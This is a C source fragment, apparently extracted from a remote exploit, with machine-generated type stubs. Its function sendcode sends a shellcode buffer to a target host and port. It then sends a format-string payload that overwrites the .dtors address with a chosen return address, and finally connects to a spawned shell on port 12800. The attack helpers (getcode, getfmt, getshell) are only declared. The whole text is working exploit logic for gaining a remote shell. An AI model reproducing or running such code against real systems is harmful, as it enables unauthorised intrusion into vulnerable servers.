
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {unsigned int pops; int ret_addr; int dtors_addr; } ;


 int CODESIZE ;
 int FMTSIZE ;
 int getcode () ;
 int getfmt (int,int,unsigned int) ;
 int getshell (char*,int) ;
 int printf (char*,...) ;
 size_t pt ;
 int send_packet (char*,unsigned short,int ,int ,int ) ;
 int sleep (int) ;
 TYPE_1__* target ;

void sendcode(char *hostname,unsigned short port,
int doff,int roff,unsigned int pops){
 printf("\ntarget=%s:%d pops=%d dtors=0x%.8lx(+%d)"
 " ret=0x%.8lx(+%d)\n\n",hostname,port,(pops?pops:
 target[pt].pops),target[pt].dtors_addr,doff,
 target[pt].ret_addr,roff);
 printf("[*] sending code buffer. (net_buffer)\n");
 send_packet(hostname,port,getcode(),CODESIZE,0);
 sleep(1);
 printf("[*] sending format string, new .dtors.\n");
 send_packet(hostname,port,getfmt(doff,roff,pops),
 FMTSIZE,0);
 sleep(1);
 getshell(hostname,12800);
 return;
}
